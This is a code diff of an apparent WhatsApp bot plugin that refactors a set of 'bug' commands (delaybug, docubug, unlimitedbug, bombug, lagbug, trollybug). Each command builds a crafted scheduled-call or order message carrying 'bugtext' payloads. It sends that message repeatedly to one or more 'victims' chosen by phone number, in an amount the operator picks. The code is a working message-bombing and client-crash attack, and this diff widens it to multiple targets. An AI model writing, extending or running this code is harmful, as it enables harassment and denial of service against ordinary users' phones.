@@ -44,8 +44,7 @@ const timewisher = (time) => {
   } 
 };
 
-async function sendbug(dest, zk, ms, repondre, amount, victims){
-    const bug = `${bugtext1}`;
+async function sendbug(dest, zk, ms, repondre, amount, victims, bug){
     for (let i = 0; i < victims.length; i++){
       if (!phoneRegex.test(victims[i])){
         repondre(`${victims[i]} not a valid phone number`);
@@ -53,13 +52,7 @@ async function sendbug(dest, zk, ms, repondre, amount, victims){
       } else {
         const victim = victims[i] + '@s.whatsapp.net';
         for (let j = 0; j < amount; j++){
-          var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
-            "scheduledCallCreationMessage": {
-              "callType": "2",
-              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-              "title": bug,
-            }
-        }), { userJid: dest, quoted : ms});
+          var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject(bug), { userJid: dest, quoted : ms});
           try {
             zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
           } catch (e) {
@@ -275,11 +268,18 @@ zokou(
     const text = arg.join('');
     let amount = 30;
     let victims = [];
+    const bug = {
+      "scheduledCallCreationMessage": {
+        "callType": "2",
+        "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+        "title": `${bugtext1}`,
+      } 
+    };
     if (arg.length === 1){
       victims.push(arg[0]);
       await repondre(`sending ${amount} bugs to ${victims[0]}`);
       try {
-        await sendbug(dest, zk, ms, repondre, amount, victims);
+        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
         } catch (e){
           await repondre('An error occured');
           console.log(`An error occured: ${e}`);
@@ -294,7 +294,7 @@ zokou(
         if (victims.length > 0){
           await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
           try {
-            await sendbug(dest, zk, ms, repondre, amount, victims);
+            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
           } catch (e){
             await repondre('An error occured');
             console.log(`An error occured: ${e}`);
@@ -318,41 +318,55 @@ zokou(
   },
   
   async (dest, zk, commandOptions) => {
-    const { ms, arg, repondre, superUser,prefixe } = commandOptions;
+    const { ms, arg, repondre, superUser, prefixe} = commandOptions;
     if (!superUser)
       return await repondre(mess.prem);
     if (!arg[0])
-      return await repondre(`Use ${prefixe}delaybug number\n> Example ${prefixe}delaybug ${conf.NUMERO_OWNER.split(',')[0]}`);
+      return await repondre(`Use ${prefixe}delaybug amount | numbers\n> Example ${prefixe}delaybug 30 |${conf.NUMERO_OWNER} or ${prefixe}delaybug ${conf.NUMERO_OWNER.split(',')[0]}`);
     await loading(dest, zk);
-    const victim = arg[0].trim() + '@s.whatsapp.net';
-    const amount = 30;
-    const bug = bugtext2;
-    if (!phoneRegex.test(arg[0].trim())){
-        return await repondre(`${arg[0]} not a valid phone number`);
-    } else {
-      for (let i = 0; i < amount; i++){
-        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
-            "scheduledCallCreationMessage": {
-              "callType": "2",
-              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-              "title": bug,
-            }
-        }), { userJid: dest, quoted : ms});
-        try {
-            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
-        } catch (e) {
-            await repondre(`An error occured while sending bugs to ${arg[0]}`);
-            await react(dest, zk, ms, '⚠️');
-            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
-            return;
-        }
-        await delay(3000);
+    const text = arg.join('');
+    let amount = 30;
+    let victims = [];
+    const bug = {
+      "scheduledCallCreationMessage": {
+        "callType": "2",
+        "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+        "title": bugtext2,
+      } 
+    };
+    if (arg.length === 1){
+      victims.push(arg[0]);
+      await repondre(`sending ${amount} bugs to ${victims[0]}`);
+      try {
+        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        } catch (e){
+          await repondre('An error occured');
+          console.log(`An error occured: ${e}`);
+          await react(dest, zk, ms, '⚠️');
       }
-      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
-      await react(dest, zk, ms, '✅');
+    } else {
+      amount = parseInt(text.split('|')[0].trim());
+      if (isNaN(amount)){
+        return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
+      } else {
+        victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
+        if (victims.length > 0){
+          await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
+          try {
+            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+          } catch (e){
+            await repondre('An error occured');
+            console.log(`An error occured: ${e}`);
+            await react(dest, zk, ms, '⚠️');
+          }
+        } else {
+          return await repondre('No victims specfied');
+        }
+      }
     }
+    await react(dest, zk, ms, '✅');
   }
-);
+  );
 
 //docubug
 zokou(
@@ -363,42 +377,55 @@ zokou(
   },
   
   async (dest, zk, commandOptions) => {
-    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
-    
+    const { ms, arg, repondre, superUser, prefixe} = commandOptions;
     if (!superUser)
       return await repondre(mess.prem);
     if (!arg[0])
-      return await repondre(`Use ${prefixe}docubug amount\n> Example ${prefixe}docubug ${conf.NUMERO_OWNER.split(',')[0]}`);
+      return await repondre(`Use ${prefixe}docubug amount | numbers\n> Example ${prefixe}docubug 30 |${conf.NUMERO_OWNER} or ${prefixe}docubug ${conf.NUMERO_OWNER.split(',')[0]}`);
     await loading(dest, zk);
-    const victim = arg[0].trim() + '@s.whatsapp.net';
-    const amount = 15;
-    const bug = `${bugtext1}`;
-    if (!phoneRegex.test(arg[0].trim())){
-      return await repondre(`${arg[0]} not a valid phone number`);
-    } else {
-      for (let i = 0; i < amount; i++){
-        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
-            "scheduledCallCreationMessage": {
-              "callType": "2",
-              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-              "title": bug,
-            }
-        }), { userJid: dest, quoted : ms});
-        try {
-            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
-        } catch (e) {
-            await repondre(`An error occured while sending bugs to ${arg[0]}`);
-            await react(dest, zk, ms, '⚠️');
-            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
-            return;
-        }
-        await delay(3000);
+    const text = arg.join('');
+    let amount = 15;
+    let victims = [];
+    const bug = {
+      "scheduledCallCreationMessage": {
+        "callType": "2",
+        "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+        "title": `${bugtext1}`,
+      } 
+    };
+    if (arg.length === 1){
+      victims.push(arg[0]);
+      await repondre(`sending ${amount} bugs to ${victims[0]}`);
+      try {
+        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        } catch (e){
+          await repondre('An error occured');
+          console.log(`An error occured: ${e}`);
+          await react(dest, zk, ms, '⚠️');
       }
-      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
-      await react(dest, zk, ms, '✅');
+    } else {
+      amount = parseInt(text.split('|')[0].trim());
+      if (isNaN(amount)){
+        return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
+      } else {
+        victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
+        if (victims.length > 0){
+          await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
+          try {
+            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+          } catch (e){
+            await repondre('An error occured');
+            console.log(`An error occured: ${e}`);
+            await react(dest, zk, ms, '⚠️');
+          }
+        } else {
+          return await repondre('No victims specfied');
+        }
+      }
     }
+    await react(dest, zk, ms, '✅');
   }
-);
+  );
 
 //unlimitedbug
 zokou(
@@ -409,41 +436,55 @@ zokou(
   },
   
   async (dest, zk, commandOptions) => {
-    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+    const { ms, arg, repondre, superUser, prefixe} = commandOptions;
     if (!superUser)
       return await repondre(mess.prem);
     if (!arg[0])
-      return await repondre(`Use ${prefixe}unlimitedbug amount\n> Example ${prefixe}unlimitedbug ${conf.NUMERO_OWNER.split(',')[0]}`);
+      return await repondre(`Use ${prefixe}unlimitedbug amount | numbers\n> Example ${prefixe}unlimitedbug 30 |${conf.NUMERO_OWNER} or ${prefixe}unlimitedbug ${conf.NUMERO_OWNER.split(',')[0]}`);
     await loading(dest, zk);
-    const victim = arg[0].trim() + '@s.whatsapp.net';
-    const amount = 30;
-    const bug = bugtext3;
-    if (!phoneRegex.test(arg[0].trim())){
-      return await repondre(`${arg[0]} not a valid phone number`);
-    } else {
-      for (let i = 0; i < amount; i++){
-        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
-            "scheduledCallCreationMessage": {
-              "callType": "2",
-              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-              "title": bug,
-            }
-        }), { userJid: dest, quoted : ms});
-        try {
-            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
-        } catch (e) {
-            await repondre(`An error occured while sending bugs to ${arg[0]}`);
-            await react(dest, zk, ms, '⚠️');
-            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
-            return;
-        }
-        await delay(3000);
+    const text = arg.join('');
+    let amount = 30;
+    let victims = [];
+    const bug = {
+      "scheduledCallCreationMessage": {
+        "callType": "2",
+        "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+        "title": bugtext3,
+      } 
+    };
+    if (arg.length === 1){
+      victims.push(arg[0]);
+      await repondre(`sending ${amount} bugs to ${victims[0]}`);
+      try {
+        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        } catch (e){
+          await repondre('An error occured');
+          console.log(`An error occured: ${e}`);
+          await react(dest, zk, ms, '⚠️');
       }
-      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
-      await react(dest, zk, ms, '✅');
+    } else {
+      amount = parseInt(text.split('|')[0].trim());
+      if (isNaN(amount)){
+        return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
+      } else {
+        victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
+        if (victims.length > 0){
+          await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
+          try {
+            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+          } catch (e){
+            await repondre('An error occured');
+            console.log(`An error occured: ${e}`);
+            await react(dest, zk, ms, '⚠️');
+          }
+        } else {
+          return await repondre('No victims specfied');
+        }
+      }
     }
+    await react(dest, zk, ms, '✅');
   }
-);
+  );
 
 //bombug
 zokou(
@@ -452,42 +493,57 @@ zokou(
     categorie: category,
     reaction: reaction
   },
+  
   async (dest, zk, commandOptions) => {
-    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+    const { ms, arg, repondre, superUser, prefixe} = commandOptions;
     if (!superUser)
       return await repondre(mess.prem);
     if (!arg[0])
-      return await repondre(`Use ${prefixe}bombug amount\n> Example ${prefixe}bombug ${conf.NUMERO_OWNER.split(',')[0]}`);
+      return await repondre(`Use ${prefixe}bombug amount | numbers\n> Example ${prefixe}bombug 30 |${conf.NUMERO_OWNER} or ${prefixe}bombug ${conf.NUMERO_OWNER.split(',')[0]}`);
     await loading(dest, zk);
-    const victim = arg[0].trim() + '@s.whatsapp.net';
-    const amount = 30;
-    const bug = bugtext4;
-    if (!phoneRegex.test(arg[0].trim())){
-      return await repondre(`${arg[0]} not a valid phone number`);
-    } else {
-      for (let i = 0; i < amount; i++){
-        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
-            "scheduledCallCreationMessage": {
-              "callType": "2",
-              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-              "title": bug,
-            }
-        }), { userJid: dest, quoted : ms});
-        try {
-            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
-        } catch (e) {
-            await repondre(`An error occured while sending bugs to ${arg[0]}`);
-            await react(dest, zk, ms, '⚠️');
-            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
-            return;
-        }
-        await delay(3000);
+    const text = arg.join('');
+    let amount = 30;
+    let victims = [];
+    const bug = {
+      "scheduledCallCreationMessage": {
+        "callType": "2",
+        "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+        "title": bugtext4,
+      } 
+    };
+    if (arg.length === 1){
+      victims.push(arg[0]);
+      await repondre(`sending ${amount} bugs to ${victims[0]}`);
+      try {
+        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        } catch (e){
+          await repondre('An error occured');
+          console.log(`An error occured: ${e}`);
+          await react(dest, zk, ms, '⚠️');
       }
-      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
-      await react(dest, zk, ms, '✅');
+    } else {
+      amount = parseInt(text.split('|')[0].trim());
+      if (isNaN(amount)){
+        return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
+      } else {
+        victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
+        if (victims.length > 0){
+          await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
+          try {
+            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+          } catch (e){
+            await repondre('An error occured');
+            console.log(`An error occured: ${e}`);
+            await react(dest, zk, ms, '⚠️');
+          }
+        } else {
+          return await repondre('No victims specfied');
+        }
+      }
     }
+    await react(dest, zk, ms, '✅');
   }
-);
+  );
 
 //lagbug
 zokou(
@@ -498,41 +554,55 @@ zokou(
   },
   
   async (dest, zk, commandOptions) => {
-    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+    const { ms, arg, repondre, superUser, prefixe} = commandOptions;
     if (!superUser)
       return await repondre(mess.prem);
     if (!arg[0])
-      return await repondre(`Use ${prefixe}lagbug amount\n> Example ${prefixe}lagbug ${conf.NUMERO_OWNER.split(',')[0]}`);
+      return await repondre(`Use ${prefixe}lagbug amount | numbers\n> Example ${prefixe}lagbug 30 |${conf.NUMERO_OWNER} or ${prefixe}lagbug ${conf.NUMERO_OWNER.split(',')[0]}`);
     await loading(dest, zk);
-    const victim = arg[0].trim() + '@s.whatsapp.net';
-    const amount = 30;
-    const bug = bugtext2;
-    if (!phoneRegex.test(arg[0].trim())){
-      return await repondre(`${arg[0]} not a valid phone number`);
-    } else {
-      for (let i = 0; i < amount; i++){
-        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
-            "scheduledCallCreationMessage": {
-              "callType": "2",
-              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-              "title": bug,
-            }
-        }), { userJid: dest, quoted : ms});
-        try {
-            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
-        } catch (e) {
-            await repondre(`An error occured while sending bugs to ${arg[0]}`);
-            await react(dest, zk, ms, '⚠️');
-            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
-            return;
-        }
-        await delay(3000);
+    const text = arg.join('');
+    let amount = 30;
+    let victims = [];
+    const bug = {
+      "scheduledCallCreationMessage": {
+        "callType": "2",
+        "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+        "title": bugtext2,
+      } 
+    };
+    if (arg.length === 1){
+      victims.push(arg[0]);
+      await repondre(`sending ${amount} bugs to ${victims[0]}`);
+      try {
+        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        } catch (e){
+          await repondre('An error occured');
+          console.log(`An error occured: ${e}`);
+          await react(dest, zk, ms, '⚠️');
       }
-      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
-      await react(dest, zk, ms, '✅');
+    } else {
+      amount = parseInt(text.split('|')[0].trim());
+      if (isNaN(amount)){
+        return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
+      } else {
+        victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
+        if (victims.length > 0){
+          await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
+          try {
+            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+          } catch (e){
+            await repondre('An error occured');
+            console.log(`An error occured: ${e}`);
+            await react(dest, zk, ms, '⚠️');
+          }
+        } else {
+          return await repondre('No victims specfied');
+        }
+      }
     }
+    await react(dest, zk, ms, '✅');
   }
-);
+  );
 
 //trollybug
 zokou(
@@ -543,19 +613,16 @@ zokou(
   },
   
   async (dest, zk, commandOptions) => {
-    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+    const { ms, arg, repondre, superUser, prefixe} = commandOptions;
     if (!superUser)
       return await repondre(mess.prem);
     if (!arg[0])
-      return await repondre(`Use ${prefixe}trollybug amount\n> Example ${prefixe}trollybug ${conf.NUMERO_OWNER.split(',')[0]}`);
+      return await repondre(`Use ${prefixe}trollybug amount | numbers\n> Example ${prefixe}trollybug 30 |${conf.NUMERO_OWNER} or ${prefixe}trollybug ${conf.NUMERO_OWNER.split(',')[0]}`);
     await loading(dest, zk);
-    const victim = arg[0].trim() + '@s.whatsapp.net';
-    const amount = 15;
-    if (!phoneRegex.test(arg[0].trim())){
-      return await repondre(`${arg[0]} not a valid phone number`);
-    } else {
-      for (let i = 0; i < amount; i++){
-        var order = generateWAMessageFromContent(dest, proto.Message.fromObject({
+    const text = arg.join('');
+    let amount = 15;
+    let victims = [];
+    const bug = {
             "orderMessage": {
               "orderId": "599519108102353",
               "thumbnailUrl":  'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg' ,
@@ -567,21 +634,37 @@ zokou(
               "sellerJid": "263785028126@s.whatsapp.net",
               "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
             }
-        }), { userJid: dest, quoted : ms});
-        try {
-            await zk.relayMessage(victim, order.message, { messageId: order.key.id });
-        } catch (e) {
-            await repondre(`An error occured while sending bugs to ${arg[0]}`);
-            await react(dest, zk, ms, '⚠️');
-            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
-            return;
-        }
-        await delay(3000);
+        };
+    if (arg.length === 1){
+      victims.push(arg[0]);
+      await repondre(`sending ${amount} bugs to ${victims[0]}`);
+      try {
+        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        } catch (e){
+          await repondre('An error occured');
+          console.log(`An error occured: ${e}`);
+          await react(dest, zk, ms, '⚠️');
       }
-      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
-      await react(dest, zk, ms, '✅');
+    } else {
+      amount = parseInt(text.split('|')[0].trim());
+      if (isNaN(amount)){
+        return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
+      } else {
+        victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
+        if (victims.length > 0){
+          await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
+          try {
+            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+          } catch (e){
+            await repondre('An error occured');
+            console.log(`An error occured: ${e}`);
+            await react(dest, zk, ms, '⚠️');
+          }
+        } else {
+          return await repondre('No victims specfied');
+        }
+      }
     }
+    await react(dest, zk, ms, '✅');
   }
-);
-
-//gcbug
+  );
